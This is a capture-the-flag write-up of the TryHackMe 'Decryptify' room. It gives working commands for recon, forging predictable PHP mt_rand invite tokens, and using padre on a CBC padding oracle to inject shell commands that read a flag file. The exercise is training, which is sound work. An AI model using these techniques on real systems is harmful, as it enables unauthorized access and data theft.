# TryHackMe - Decryptify

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Medium |
| OS | Ubuntu / Linux |
| Key services | SSH, Apache on `1337` |
| Main bugs | Public logs, client-side secret, predictable `mt_rand`, padding oracle, command injection |

## Attack Chain Overview

```text
Nmap -> web fuzzing on :1337 -> public app.log invite code
  -> JS obfuscated API key
  -> API docs reveal PHP mt_rand token generation
  -> recover constant from known invite
  -> generate token for hello@fake.thm
  -> dashboard access
  -> CBC padding oracle on encrypted date parameter
  -> encrypt chosen shell commands
  -> flag read
```

## Summary

Decryptify was a weak-crypto application logic chain. A public log leaked a base64 invite code and usernames. Client-side JavaScript contained an obfuscated API key, recoverable from the browser console. The API documentation then revealed invite tokens were generated with deterministic PHP `mt_rand()` seeding.

Using the known `alpha@fake.thm` invite token, the constant value was brute-forced and a valid token was generated for `hello@fake.thm`. After login, the encrypted `date` dashboard parameter exposed padding errors. `padre` decrypted the original command (`date +%Y`) and encrypted chosen commands, turning the padding oracle into command injection.

## Reconnaissance

Tools: [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md), [curl](../../../tools/web/curl.md).

```bash
# What it does: run a full port scan and service enumeration.
# Why here: discover the Apache instance on port 1337 and map the entry point.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET --open -oN silent
nmap -sVC -p22,1337 $TARGET -oN service
# What it does: brute-force directories and files with Feroxbuster.
# Why here: locate the /logs/ directory and identify sensitive files like app.log.
feroxbuster -u http://$TARGET:1337 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  --dont-scan locale
```

## Public Logs and API Key

Full techniques: [Public log invite code disclosure](../../../exploits/web-disclosure/public-log-invite-code-disclosure.md), [JavaScript obfuscated API key disclosure](../../../exploits/web-disclosure/javascript-obfuscated-api-key.md).

```text
http://$TARGET:1337/logs/app.log
```

```bash
# What it does: decode the Base64 invite code.
# Why here: retrieve the numeric value used to brute-force the mt_rand constant.
echo "MTM0ODMzNzEyMg==" | base64 -d
# What it does: retrieve the obfuscated JavaScript file.
# Why here: analyze the client-side code to extract the hidden API key.
curl http://$TARGET:1337/js/api.js
```

In the browser console:

```javascript
console.log(c);
```

The recovered API key unlocked `api.php`, which documented token generation.

## Predictable Token Generation

Full technique: [PHP mt_rand token prediction](../../../techniques/crypto/php-mt-rand-token-prediction.md).

Known pair:

```text
alpha@fake.thm -> MTM0ODMzNzEyMg==
```

Brute-force the constant:

```bash
# What it does: run the constant recovery script.
# Why here: identify the deterministic constant used in the PHP mt_rand seeding logic.
php get_constant.php
```

Generate a token for `hello@fake.thm`:

```bash
# What it does: generate a valid invite token.
# Why here: create a session-ready token for a targeted email address to bypass the invite wall.
php get_token.php
```

Login:

```bash
# What it does: send an HTTP request to the target web server.
# Why here: retrieve obfuscated JS files or authenticate with the generated tokens.
curl -X POST http://$TARGET:1337/index.php \
  -d "invite_username=hello@fake.thm&invite_code=TOKEN_GENERATED" \
  -c cookies.txt -L
```

## Padding Oracle Command Injection

Full technique: [Padding oracle to command injection](../../../techniques/crypto/padding-oracle-command-injection.md). Tool: [padre](../../../tools/web/padre.md).

Decrypt the original value:

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  'P6HqVqxBsuk77Gu7l8M+RrsLU8qI48mSEoqaOYAW1+Y='
```

Confirm command execution:

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  -enc 'id'
```

Avoid spaces when needed:

```bash
padre -cookie 'PHPSESSID=...; role=...' \
  -u "http://$TARGET:1337/dashboard.php?date=$" \
  -enc 'base64</home/ubuntu/flag.txt'
# What it does: decode the Base64-encoded flag file content.
# Why here: read the final flag after bypassing the dashboard command filtering.
echo "OUTPUT_BASE64" | base64 -d
```

## Key Takeaways

- A public log can be enough to break the whole invite flow.
- JavaScript obfuscation does not protect client-side secrets.
- Predictably seeded `mt_rand()` is not suitable for security tokens.
- A padding oracle gets much worse when plaintext reaches shell execution.

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [curl](../../../tools/web/curl.md)
- [padre](../../../tools/web/padre.md)
- [Public log invite code disclosure](../../../exploits/web-disclosure/public-log-invite-code-disclosure.md)
- [JavaScript obfuscated API key disclosure](../../../exploits/web-disclosure/javascript-obfuscated-api-key.md)
- [PHP mt_rand token prediction](../../../techniques/crypto/php-mt-rand-token-prediction.md)
- [Padding oracle to command injection](../../../techniques/crypto/padding-oracle-command-injection.md)
